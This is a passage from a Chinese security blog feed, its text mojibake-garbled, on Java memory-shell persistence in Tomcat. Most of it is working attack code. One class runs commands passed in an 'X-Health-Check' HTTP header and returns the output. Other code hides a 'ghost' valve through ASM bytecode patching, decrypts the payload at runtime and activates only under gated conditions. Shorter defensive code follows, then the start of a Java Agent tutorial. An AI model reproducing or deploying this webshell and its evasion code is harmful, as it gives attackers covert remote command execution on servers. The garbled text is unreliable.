å¦‚æœæ˜¯æ¶æ„è¯·æ±‚ï¼Œç›´æ¥è¿”å›</span><br>                        mv.visitInsn(Opcodes.RETURN);<br>                        <br>                        mv.visitLabel(skipLabel);<br>                        <span class="hljs-built_in">super</span>.visitCode();<br>                    &#125;<br>                &#125;;<br>            &#125;<br>            <span class="hljs-keyword">return</span> mv;<br>        &#125;<br>    &#125;, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> cw.toByteArray();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2. åµŒå…¥å¼æ¶æ„é€»è¾‘ç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmbeddedLogic</span> &#123;<br>    <span class="hljs-comment">// è¯·æ±‚æ£€æµ‹é€»è¾‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkRequest</span><span class="hljs-params">(Request request)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">trigger</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;X-Health-Check&quot;</span>);<br>        <span class="hljs-keyword">if</span> (trigger != <span class="hljs-literal">null</span> &amp;&amp; trigger.startsWith(<span class="hljs-string">&quot;v1-&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> trigger.substring(<span class="hljs-number">3</span>);<br>            executeCommand(cmd, request.getResponse());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// å‘½ä»¤æ‰§è¡Œé€»è¾‘ï¼ˆå¤šå¹³å°å…¼å®¹ï¼‰</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String cmd, Response response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] commands;<br>            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>            &#125;<br>            <br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(commands);<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> p.getInputStream();<br>                 <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter()) &#123;<br>                <br>                <span class="hljs-comment">// æµå¼ä¼ è¾“ç»“æœ</span><br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];<br>                <span class="hljs-type">int</span> bytesRead;<br>                <span class="hljs-keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                    writer.write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(buffer, <span class="hljs-number">0</span>, bytesRead));<br>                &#125;<br>            &#125;<br>            p.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// é”™è¯¯å¤„ç†ï¼ˆä¸ç•™æ ˆè½¨è¿¹ï¼‰</span><br>            response.getWriter().write(<span class="hljs-string">&quot;ERROR: Command execution failed&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸‰ã€éšè”½æ€§å¢å¼ºæŠ€æœ¯"><a href="#ä¸‰ã€éšè”½æ€§å¢å¼ºæŠ€æœ¯" class="headerlink" title="ä¸‰ã€éšè”½æ€§å¢å¼ºæŠ€æœ¯"></a>ä¸‰ã€éšè”½æ€§å¢å¼ºæŠ€æœ¯</h3><p><strong>1. å¹½çµValveæŠ€æœ¯</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä¿®æ”¹StandardPipelineçš„addValveæ–¹æ³•</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> access, String name, String desc, </span><br><span class="hljs-params">                                String signature, String[] exceptions)</span> &#123;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;addValve&quot;</span>.equals(name) &amp;&amp; <br>        <span class="hljs-string">&quot;(Lorg/apache/catalina/Valve;)V&quot;</span>.equals(desc)) &#123;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodVisitor</span>(Opcodes.ASM9, <br>            <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions)) &#123;<br>            <br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitCode</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-comment">// åœ¨æ·»åŠ Valveå‰è¿›è¡Œæ£€æŸ¥</span><br>                mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">1</span>);  <span class="hljs-comment">// åŠ è½½Valveå‚æ•°</span><br>                mv.visitMethodInsn(Opcodes.INVOKESTATIC, <br>                                  <span class="hljs-string">&quot;com/evil/EmbeddedLogic&quot;</span>, <br>                                  <span class="hljs-string">&quot;isGhostValve&quot;</span>, <br>                                  <span class="hljs-string">&quot;(Lorg/apache/catalina/Valve;)Z&quot;</span>, <br>                                  <span class="hljs-literal">false</span>);<br>                <br>                <span class="hljs-type">Label</span> <span class="hljs-variable">normalPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>();<br>                mv.visitJumpInsn(Opcodes.IFEQ, normalPath);<br>                <br>                <span class="hljs-comment">// å¹½çµValveï¼šä¸åŠ å…¥ä¸»æ•°ç»„ï¼ŒåŠ å…¥éšè—åˆ—è¡¨</span><br>                mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">0</span>);  <span class="hljs-comment">// this</span><br>                mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">1</span>);  <span class="hljs-comment">// Valve</span><br>                mv.visitMethodInsn(Opcodes.INVOKESTATIC, <br>                                  <span class="hljs-string">&quot;com/evil/EmbeddedLogic&quot;</span>, <br>                                  <span class="hljs-string">&quot;addToGhostList&quot;</span>, <br>                                  <span class="hljs-string">&quot;(Lorg/apache/catalina/core/StandardPipeline;Lorg/apache/catalina/Valve;)V&quot;</span>, <br>                                  <span class="hljs-literal">false</span>);<br>                mv.visitInsn(Opcodes.RETURN);<br>                <br>                mv.visitLabel(normalPath);<br>                <span class="hljs-built_in">super</span>.visitCode();<br>            &#125;<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2. åŠ¨æ€ä»£ç è§£å¯†</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmbeddedLogic</span> &#123;<br>    <span class="hljs-comment">// åŠ å¯†çš„å‘½ä»¤æ‰§è¡Œé€»è¾‘</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] ENCRYPTED_LOGIC = &#123;<span class="hljs-number">0x12</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x78</span>, ...&#125;;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String cmd, Response response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// åŠ¨æ€è§£å¯†å¹¶æ‰§è¡Œ</span><br>            <span class="hljs-type">byte</span>[] decrypted = decrypt(ENCRYPTED_LOGIC, getRuntimeKey());<br>            <span class="hljs-type">MethodHandle</span> <span class="hljs-variable">mh</span> <span class="hljs-operator">=</span> MethodHandles.lookup().defineHiddenClass(<br>                decrypted, <span class="hljs-literal">true</span>, MethodHandles.Lookup.ClassOption.NESTMATE)<br>                .findStatic(<span class="hljs-string">&quot;Stealth&quot;</span>, <span class="hljs-string">&quot;run&quot;</span>, MethodType.methodType(<span class="hljs-keyword">void</span>.class, String.class, Response.class));<br>            <br>            mh.invokeExact(cmd, response);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            <span class="hljs-comment">// é”™è¯¯å¤„ç†</span><br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// åŸºäºç¯å¢ƒåŠ¨æ€ç”Ÿæˆå¯†é’¥</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getRuntimeKey() &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">seed</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.name&quot;</span>) + <br>                      System.getenv(<span class="hljs-string">&quot;CATALINA_HOME&quot;</span>);<br>        <span class="hljs-keyword">return</span> MessageDigest.getInstance(<span class="hljs-string">&quot;SHA-256&quot;</span>)<br>            .digest(seed.getBytes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3. ç¯å¢ƒæ„ŸçŸ¥ä¼ªè£…</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkRequest</span><span class="hljs-params">(Request request)</span> &#123;<br>    <span class="hljs-comment">// ä»…åœ¨ç”Ÿäº§ç¯å¢ƒæ¿€æ´»</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;production&quot;</span>.equals(System.getProperty(<span class="hljs-string">&quot;app.env&quot;</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚æ¥æºIPï¼ˆä»…å…è®¸å†…ç½‘ï¼‰</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">remoteAddr</span> <span class="hljs-operator">=</span> request.getRemoteAddr();<br>    <span class="hljs-keyword">if</span> (!remoteAddr.startsWith(<span class="hljs-string">&quot;192.168.&quot;</span>) &amp;&amp; <br>        !remoteAddr.startsWith(<span class="hljs-string">&quot;10.&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚æ—¶é—´ï¼ˆä»…UTC 02:00-04:00æ¿€æ´»ï¼‰</span><br>    <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> ZonedDateTime.now(ZoneId.of(<span class="hljs-string">&quot;UTC&quot;</span>));<br>    <span class="hljs-keyword">if</span> (now.getHour() &lt; <span class="hljs-number">2</span> || now.getHour() &gt; <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// çœŸæ­£çš„è§¦å‘é€»è¾‘...</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å››ã€æ£€æµ‹é˜²å¾¡ç­–ç•¥"><a href="#å››ã€æ£€æµ‹é˜²å¾¡ç­–ç•¥" class="headerlink" title="å››ã€æ£€æµ‹é˜²å¾¡ç­–ç•¥"></a>å››ã€æ£€æµ‹é˜²å¾¡ç­–ç•¥</h3><p><strong>1. ç±»å®Œæ•´æ€§éªŒè¯</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassIntegrityVerifier</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, String&gt; KNOWN_DIGESTS = Map.of(<br>        <span class="hljs-string">&quot;org.apache.catalina.core.StandardPipeline&quot;</span>, <span class="hljs-string">&quot;a1b2c3d4...&quot;</span>,<br>        <span class="hljs-string">&quot;org.apache.catalina.core.StandardContextValve&quot;</span>, <span class="hljs-string">&quot;e5f6g7h8...&quot;</span><br>    );<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">verify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (Class&lt;?&gt; clazz : Instrumentation.getAllLoadedClasses()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">digest</span> <span class="hljs-operator">=</span> calculateClassDigest(clazz);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">expected</span> <span class="hljs-operator">=</span> KNOWN_DIGESTS.get(clazz.getName());<br>            <br>            <span class="hljs-keyword">if</span> (expected != <span class="hljs-literal">null</span> &amp;&amp; !expected.equals(digest)) &#123;<br>                SecurityLogger.alert(<span class="hljs-string">&quot;Class tampered: &quot;</span> + clazz.getName());<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">calculateClassDigest</span><span class="hljs-params">(Class&lt;?&gt; clazz)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] bytecode = getClassBytes(clazz);<br>            <span class="hljs-keyword">return</span> DigestUtils.sha256Hex(bytecode);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2. è¿è¡Œæ—¶è¡Œä¸ºç›‘æ§</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PipelineMonitorValve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Valve original;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">requestCount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>();<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PipelineMonitorValve</span><span class="hljs-params">(Valve original)</span> &#123;<br>        <span class="hljs-built_in">this</span>.original = original;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.nanoTime();<br>        original.invoke(request, response);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.nanoTime() - start;<br>        <br>        <span class="hljs-comment">// å¼‚å¸¸æ£€æµ‹é€»è¾‘</span><br>        <span class="hljs-keyword">if</span> (duration &gt; TimeUnit.MILLISECONDS.toNanos(<span class="hljs-number">500</span>)) &#123;<br>            SecurityLogger.logLongInvocation(request, duration);<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (requestCount.incrementAndGet() % <span class="hljs-number">1000</span> == <span class="hljs-number">0</span>) &#123;<br>            SecurityLogger.snapshotPipelineState();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3. JVMå±‚é˜²æŠ¤</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># å¯ç”¨JVMå®‰å…¨ç­–ç•¥<br>-Djava.<span class="hljs-keyword">security</span>.manager <br>-Djava.<span class="hljs-keyword">security</span>.<span class="hljs-keyword">policy</span>==tomcat.<span class="hljs-keyword">policy</span><br><br># ç¦æ­¢éæ³•Attach<br>-Djdk.attach.allowAttachSelf=<span class="hljs-keyword">false</span><br>-Djdk.attach.allowAttachSelf=<span class="hljs-keyword">true</span>:com.<span class="hljs-keyword">trusted</span>.app<br></code></pre></td></tr></table></figure><p><strong>tomcat.policyç¤ºä¾‹ï¼š</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">grant &#123;<br>    // ç¦æ­¢å…³é”®åŒ…ä¿®æ”¹<br>    permission java.lang.RuntimePermission <span class="hljs-string">&quot;modifyPackage.org.apache.catalina.core&quot;</span><span class="hljs-comment">;</span><br>    <br>    // é™åˆ¶åå°„è®¿é—®<br>    permission java.lang.reflect.ReflectPermission <span class="hljs-string">&quot;suppressAccessChecks&quot;</span><span class="hljs-comment">;</span><br>    <br>    // ç¦æ­¢åˆ›å»ºç±»åŠ è½½å™¨<br>    permission java.lang.RuntimePermission <span class="hljs-string">&quot;createClassLoader&quot;</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javaå®‰å…¨</tag>
      
      <tag>å†…å­˜é©¬</tag>
      
      <tag>è½¬è½½</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬</title>
    <link href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E5%9B%9B%E7%AF%87%20-%20Agent%20%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E5%9B%9B%E7%AF%87%20-%20Agent%20%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-å†…å­˜é©¬ç¬¬å››ç¯‡-Agent-å†…å­˜é©¬"><a href="#Java-å†…å­˜é©¬ç¬¬å››ç¯‡-Agent-å†…å­˜é©¬" class="headerlink" title="Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬"></a>Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬</h1><h1 id="å››ã€-Java-Agent-å†…å­˜é©¬"><a href="#å››ã€-Java-Agent-å†…å­˜é©¬" class="headerlink" title="å››ã€ Java Agent å†…å­˜é©¬"></a>å››ã€ Java Agent å†…å­˜é©¬</h1><h2 id="4-1-Java-Agentç¤ºä¾‹"><a href="#4-1-Java-Agentç¤ºä¾‹" class="headerlink" title="4.1 Java Agentç¤ºä¾‹"></a>4.1 Java Agentç¤ºä¾‹</h2><p>å¯¹äºAgentï¼ˆä»£ç†ï¼‰æ¥è®²ï¼Œå…¶å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯åœ¨<strong>JVMå¯åŠ¨å‰åŠ è½½çš„</strong><code>**premain-Agent**</code>ï¼Œå¦ä¸€ç§æ˜¯<strong>JVMå¯åŠ¨ä¹‹ååŠ è½½çš„</strong><code>**agentmain-Agent**</code>ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£æˆä¸€ç§ç‰¹æ®Šçš„Interceptorï¼ˆæ‹¦æˆªå™¨ï¼‰ï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523591.jpeg" alt="premain-Agent"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523236.jpeg" alt="agentmain-Agent"></p><h3 id="4-1-1-premain-Agent"><a href="#4-1-1-premain-Agent" class="headerlink" title="4.1.1 premain-Agent"></a>4.1.1 premain-Agent</h3><h4 id="ä½¿ç”¨å¤–éƒ¨-MANIFEST-MF-æ–‡ä»¶-åˆ›å»º"><a href="#ä½¿ç”¨å¤–éƒ¨-MANIFEST-MF-æ–‡ä»¶-åˆ›å»º" class="headerlink" title="ä½¿ç”¨å¤–éƒ¨ MANIFEST.MF æ–‡ä»¶ åˆ›å»º"></a>ä½¿ç”¨å¤–éƒ¨ MANIFEST.MF æ–‡ä»¶ åˆ›å»º</h4><h5 id="åˆ›å»ºJava-Agentç±»"><a href="#åˆ›å»ºJava-Agentç±»" class="headerlink" title="åˆ›å»ºJava Agentç±»"></a>åˆ›å»ºJava Agentç±»</h5><p>æ­¤å¤„ä¸å†™åŒ…åï¼Œé¿å…åç»­çš„ç¼–è¯‘çš„ jar åŒ…æ‰¾ä¸åˆ°ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//package com.premain.agent;</span><br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaAgentPremain</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span><span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">10</span> ; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;premain-Agent&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="åˆ›å»ºMANIFEST-MFæ–‡ä»¶"><a href="#åˆ›å»ºMANIFEST-MFæ–‡ä»¶" class="headerlink" title="åˆ›å»ºMANIFEST.MFæ–‡ä»¶"></a>åˆ›å»ºMANIFEST.MFæ–‡ä»¶</h5><p><strong>æœ€åå¿…é¡»æœ‰ä¸€ä¸ªç©ºè¡Œï¼</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Premain-Class: JavaAgentPremain<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br>Created-By: Manual Compilation<br></code></pre></td></tr></table></figure><p>â€‹</p><h5 id="åˆ›å»ºæµ‹è¯•ä¸»ç¨‹åº"><a href="#åˆ›å»ºæµ‹è¯•ä¸»ç¨‹åº" class="headerlink" title="åˆ›å»ºæµ‹è¯•ä¸»ç¨‹åº"></a>åˆ›å»ºæµ‹è¯•ä¸»ç¨‹åº</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//package com.test;</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello Agent!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Main-Class: HelloAgent<br>Created-By: Manual Compilation<br></code></pre></td></tr></table></figure><h5 id="ç›®å½•ç»“æ„ï¼š"><a href="#ç›®å½•ç»“æ„ï¼š" class="headerlink" 